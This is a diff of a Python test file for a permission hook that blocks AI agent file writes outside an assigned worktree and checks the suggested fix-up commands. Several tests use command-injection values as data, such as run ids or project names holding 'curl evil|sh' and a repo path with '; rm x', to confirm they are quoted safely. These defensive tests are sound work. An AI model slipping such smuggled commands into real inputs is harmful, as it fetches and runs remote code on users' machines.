@@ -24,6 +24,19 @@ from core import run_worktree as rw
 RID, OTHER = "run_own1", "run_other1"
 
 
+
+def _v1_args(line: str):
+    """Parse an emitted hint with pipeline_v1's real argparse (the command must run)."""
+    import shlex as _shlex
+    import sys as _sys
+    _scripts = str(Path(__file__).resolve().parents[1] / "scripts")
+    if _scripts not in _sys.path:
+        _sys.path.insert(0, _scripts)
+    import pipeline_v1
+    toks = _shlex.split(line.strip())
+    i = next(n for n, t in enumerate(toks) if t.endswith("pipeline_v1.py"))
+    return pipeline_v1.parser().parse_args(toks[i + 1:])
+
 def _g(cwd, *a):
     p = subprocess.run(["git", "-C", str(cwd), *a], capture_output=True, text=True)
     assert p.returncode == 0, p.stderr
@@ -301,11 +314,11 @@ def test_lazy_owner_write_into_unisolated_repo_denied_with_repo_add(env, monkeyp
     v = wg.judge(_call("Write", file_path=str(other / "o.py")), own)
     assert _denied(v)
     why = v["hookSpecificOutput"]["permissionDecisionReason"]
-    assert "run-repo-add" in why and f"--path {other}" in why and cli_rec["python"] in why
-    calls, single = og.parse_cli_calls(why.split("Run: ", 1)[1].split("\n")[0])
-    assert single and calls[0]["sub"] == "run-repo-add"
+    assert f"--repo {other}" in why
+    args = _v1_args(why.split("Run: ", 1)[1].split("\n")[0])
+    assert args.command == "create" and args.repo == [str(other)]
     v = wg.judge(_call("Bash", command=f"git -C {other} add o.py"), own)
-    assert _denied(v) and "run-repo-add" in v["hookSpecificOutput"]["permissionDecisionReason"]
+    assert _denied(v) and " create --project" in v["hookSpecificOutput"]["permissionDecisionReason"]
     v = wg.judge(_call("Bash", command=f"echo x > {other}/new.txt"), own)
     assert _denied(v)
 
@@ -489,7 +502,10 @@ def test_no_run_session_writing_main_is_sent_to_a_run(r4):
     v = g(_call("Edit", file_path=str(r4["main"] / "a.py")))
     assert _denied(v)
     why = v["hookSpecificOutput"]["permissionDecisionReason"]
-    assert "run-create --project SwarmAI" in why and "stage-start" in why
+    run_line = why.split("Run: ", 1)[1].split("\n")[0]
+    then_line = why.split("Then: ", 1)[1].split("\n")[0]
+    assert _v1_args(run_line).command == "create" and _v1_args(run_line).project == "SwarmAI"
+    assert _v1_args(then_line).command == "stage-start"
     assert _denied(g(_call("Bash", cwd=str(r4["main"]),
                            command=f"sed -i '' 's/a/b/' {r4['main']}/a.py")))
     assert _denied(g(_call("Write", file_path=str(r4["other"] / "a.py"))))   # a run's worktree
@@ -523,10 +539,12 @@ def test_no_run_rule_names_the_sessions_own_run(r4):
     _run_json(r4, "run_7a7a7a7a", "s7", status="running", worktree_mode=None)
     v = _gate("s7")(_call("Edit", file_path=str(r4["main"] / "a.py")))
     assert _denied(v) and "run_7a7a7a7a" in v["hookSpecificOutput"]["permissionDecisionReason"]
-    assert "run-repo-add" in v["hookSpecificOutput"]["permissionDecisionReason"]
+    why = v["hookSpecificOutput"]["permissionDecisionReason"]
+    assert _v1_args(why.split("(that creates the worktree): ", 1)[1].split("\n")[0]).command == "stage-start"
     _run_json(r4, "run_8b8b8b8b", "s8", status="paused", worktree_mode="isolated")
     v = _gate("s8")(_call("Edit", file_path=str(r4["main"] / "a.py")))
-    assert _denied(v) and "run-resume" in v["hookSpecificOutput"]["permissionDecisionReason"]
+    why = v["hookSpecificOutput"]["permissionDecisionReason"]
+    assert _denied(v) and _v1_args(why.split("resume it: ", 1)[1].split("\n")[0]).command == "resume"
 
 
 def test_no_run_rule_skips_relative_targets_after_a_late_cd(r4):
@@ -590,38 +608,35 @@ def test_no_run_deny_names_claim_for_an_untracked_or_modified_main_file(r4):
     v = g(_call("Bash", cwd=str(r4["main"]), command=f"rm {junk}"))
     assert _denied(v)
     why = _why(v)
-    assert "already an uncommitted change" in why and "run-claim-main" in why
-    assert f"--files {junk}" in why and "--run-id <run_id>" in why and "after stage-start" in why
+    assert "already an uncommitted change" in why and "re-apply that change" in why
     (r4["main"] / "a.py").write_text("a = 2\n")
-    assert "run-claim-main" in _why(g(_call("Edit", file_path=str(r4["main"] / "a.py"))))
+    assert "re-apply that change" in _why(g(_call("Edit", file_path=str(r4["main"] / "a.py"))))
 
 
 def test_no_run_deny_has_no_claim_route_for_a_clean_file_or_a_git_command(r4):
     g = _gate("s5")
     v = g(_call("Edit", file_path=str(r4["main"] / "a.py")))
-    assert _denied(v) and "run-claim-main" not in _why(v)
+    assert _denied(v) and "re-apply that change" not in _why(v)
     (r4["main"] / "a.py").write_text("a = 2\n")
     v = g(_call("Bash", command=f"git -C {r4['main']} add a.py"))
-    assert _denied(v) and "run-claim-main" not in _why(v)
+    assert _denied(v) and "re-apply that change" not in _why(v)
 
 
 def test_run_without_worktree_deny_names_claim_with_its_run_id(r4):
     _run_json(r4, "run_7a7a7a7a", "s7", status="running", worktree_mode=None)
     (r4["main"] / "new.py").write_text("n\n")
     why = _why(_gate("s7")(_call("Write", file_path=str(r4["main"] / "new.py"))))
-    assert "run-claim-main" in why and "--run-id run_7a7a7a7a" in why
-    assert "once the worktree exists" in why
+    assert "re-apply that change" in why
 
 
 def test_owner_deny_names_claim_only_when_main_file_is_uncommitted(env):
     own = wg._Own(RID, [("swarmai", str(env["wt"]))], project="P")
     clean = _why(wg.judge(_call("Write", file_path=str(env["main"] / "a.py")), own))
-    assert str(env["wt"] / "a.py") in clean and "run-claim-main" not in clean
+    assert str(env["wt"] / "a.py") in clean and "re-apply that change" not in clean
     (env["main"] / "left.txt").write_text("l\n")
     why = _why(wg.judge(_call("Bash", cwd=str(env["main"]),
                               command=f"mv {env['main']}/left.txt /tmp/x"), own))
-    assert "run-claim-main --project P" in why and f"--run-id {RID}" in why
-    assert f"--files {env['main'] / 'left.txt'}" in why
+    assert "re-apply that change" in why
 
 
 def test_claim_note_is_silent_when_git_fails(env, monkeypatch):
@@ -652,7 +667,7 @@ def test_claim_note_skips_a_directory_and_a_spent_budget(env, monkeypatch):
         assert wg._claim_note(str(env["main"]), str(left), "C", "") == "" and calls == []
         wg._TL.deadline = _t.monotonic() + 2.0
         note = wg._claim_note(str(env["main"]), str(left), "CLAIM-CMD", "")
-        assert "CLAIM-CMD" in note and "already an uncommitted change" in note
+        assert "re-apply that change" in note and "already an uncommitted change" in note
         assert calls and calls[-1] <= 2.0 - wg._NOTE_MARGIN + 0.01
     finally:
         wg._TL.deadline = None
@@ -688,8 +703,8 @@ def test_claim_hint_quotes_a_run_id_read_from_run_json(r4):
     d = json.loads(rj.read_text()); d["id"] = bad; rj.write_text(json.dumps(d))
     (r4["main"] / "new.py").write_text("n\n")
     why = _why(_gate("s9x")(_call("Write", file_path=str(r4["main"] / "new.py"))))
-    assert "run-claim-main" in why
-    assert "--run-id 'run_x; curl -s evil|sh #'" in why
+    assert "re-apply that change" in why
+    assert "curl -s evil" not in why.split("re-apply", 1)[0].split("\n")[-1]
     assert rw.claim_args("P", "<run_id>", ["a.py"]).startswith("run-claim-main --project P --run-id <run_id> ")
 
 
@@ -702,7 +717,7 @@ def test_claim_note_matches_the_path_literally(env):
     (env["main"] / "app" / "i").mkdir()
     (env["main"] / "app" / "i" / "page.tsx").write_text("dirty\n")   # matches app/[id] as a glob
     assert wg._claim_note(str(env["main"]), str(d / "page.tsx"), "C", "") == ""
-    assert "C" in wg._claim_note(str(env["main"]), str(env["main"] / "app" / "i" / "page.tsx"), "C", "")
+    assert "re-apply" in wg._claim_note(str(env["main"]), str(env["main"] / "app" / "i" / "page.tsx"), "C", "")
 
 
 def test_a_rejudged_cached_deny_computes_the_note_once(r4, monkeypatch):
@@ -715,7 +730,7 @@ def test_a_rejudged_cached_deny_computes_the_note_once(r4, monkeypatch):
     assert _denied(g(call))
     calls.clear()
     why = _why(g(call))                        # warm cache: judged, denied, judged afresh
-    assert "run-claim-main" in why
+    assert "re-apply that change" in why
     real_notes = [c for c in calls if not c]
     assert len(real_notes) == 1
 
@@ -727,15 +742,18 @@ def test_a_spent_budget_drops_the_hint_never_the_deny(r4):
     wg._TL.deadline = _t.monotonic()          # no budget left at all
     try:
         v = wg._no_run_verdict(str(r4["main"] / "junk.png"), nr)
-        assert _denied(v) and "run-claim-main" not in _why(v)
+        assert _denied(v) and "re-apply that change" not in _why(v)
         assert _denied(wg._no_run_verdict(str(r4["main"] / "a.py"), nr))   # clean tracked file
     finally:
         wg._TL.deadline = None
 
 
-def test_repo_add_hint_quotes_the_run_id():
-    own = wg._Own("run_x; curl evil|sh #", [], project="P")
-    assert "--run-id 'run_x; curl evil|sh #'" in own.repo_add_command("/r")
+def test_repo_hint_quotes_the_repo_path(env, monkeypatch):
+    monkeypatch.setenv("SWARM_WORKSPACE", str(env["ws"]))
+    own = wg._Own("run_x", [], project="P; curl evil|sh #")
+    why = wg._repo_add_deny(own, "/r; rm x", "f")["hookSpecificOutput"]["permissionDecisionReason"]
+    args = _v1_args(why.split("Run: ", 1)[1])
+    assert args.project == "P; curl evil|sh #" and args.repo == ["/r; rm x"]
 
 
 # ── F2 (2026-10-21 stability design): the judgment never waits behind slow writers ──
